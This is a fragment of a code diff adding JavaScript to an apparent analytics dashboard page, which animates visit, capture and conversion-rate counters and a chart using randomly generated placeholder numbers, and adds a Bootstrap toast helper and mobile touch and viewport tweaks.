+            const newVisits = currentVisits + Math.floor(Math.random() * 20) + 10;
+            animateNumber(visitsElement, currentVisits, newVisits);
+        }
+
+        if (capturesElement) {
+            const currentCaptures = parseInt(capturesElement.textContent);
+            const newCaptures = currentCaptures + Math.floor(Math.random() * 5) + 2;
+            animateNumber(capturesElement, currentCaptures, newCaptures);
+        }
+
+        // Update conversion rate
+        const rateElement = document.getElementById('conversionRate');
+        if (rateElement) {
+            const currentRate = parseFloat(rateElement.textContent);
+            const newRate = Math.max(20, Math.min(30, currentRate + (Math.random() - 0.5) * 2));
+            rateElement.textContent = newRate.toFixed(1) + '%';
+        }
+
+        // Update chart data on mobile
+        if (window.performanceChart && window.innerWidth < 768) {
+            updateMobileChartData();
+        }
+    }, 30000); // Update every 30 seconds
+}
+
+function animateNumber(element, from, to) {
+    const duration = 1000;
+    const start = Date.now();
+
+    function update() {
+        const elapsed = Date.now() - start;
+        const progress = Math.min(elapsed / duration, 1);
+
+        const current = Math.floor(from + (to - from) * progress);
+        element.textContent = current.toLocaleString();
+
+        if (progress < 1) {
+            requestAnimationFrame(update);
+        }
+    }
+
+    update();
+}
+
+function updateMobileChartData() {
+    // Add new data point to mobile charts
+    if (window.performanceChart) {
+        const newVisits = Math.floor(Math.random() * 50) + 100;
+        const newCaptures = Math.floor(Math.random() * 20) + 15;
+
+        window.performanceChart.data.datasets[0].data.push(newVisits);
+        window.performanceChart.data.datasets[1].data.push(newCaptures);
+
+        if (window.performanceChart.data.datasets[0].data.length > 24) {
+            window.performanceChart.data.datasets[0].data.shift();
+            window.performanceChart.data.datasets[1].data.shift();
+        }
+
+        window.performanceChart.update('none');
+    }
+}
+
+// Toast function
+function showToast(message, type = 'info') {
+    const toastHtml = `
+        <div class="toast align-items-center text-white bg-${type === 'success' ? 'success' : type === 'warning' ? 'warning' : type === 'danger' ? 'danger' : 'info'} border-0" role="alert">
+            <div class="d-flex">
+                <div class="toast-body">${message}</div>
+                <button type="button" class="btn-close btn-close-white me-2 m-auto" data-bs-dismiss="toast"></button>
+            </div>
+        </div>
+    `;
+
+    let toastContainer = document.getElementById('toastContainer');
+    if (!toastContainer) {
+        toastContainer = document.createElement('div');
+        toastContainer.id = 'toastContainer';
+        toastContainer.className = 'toast-container position-fixed top-0 end-0 p-3';
+        document.body.appendChild(toastContainer);
+    }
+
+    toastContainer.insertAdjacentHTML('beforeend', toastHtml);
+    const toast = new bootstrap.Toast(toastContainer.lastElementChild);
+    toast.show();
+}
+
+// Initialize mobile features
+document.addEventListener('DOMContentLoaded', function() {
+    // Start real-time updates
+    startRealTimeUpdates();
+
+    // Add touch feedback to buttons
+    document.querySelectorAll('.btn').forEach(btn => {
+        btn.addEventListener('touchstart', function() {
+            this.style.transform = 'scale(0.95)';
+        });
+        btn.addEventListener('touchend', function() {
+            setTimeout(() => {
+                this.style.transform = 'scale(1)';
+            }, 150);
+        });
+    });
+
+    // Mobile viewport height fix for 100vh issues
+    function setVH() {
+        let vh = window.innerHeight * 0.01;
+        document.documentElement.style.setProperty('--vh', `${vh}px`);
+    }
+
+    setVH();
+    window.addEventListener('resize', setVH);
+    window.addEventListener('orientationchange', setVH);
+});
+</script>
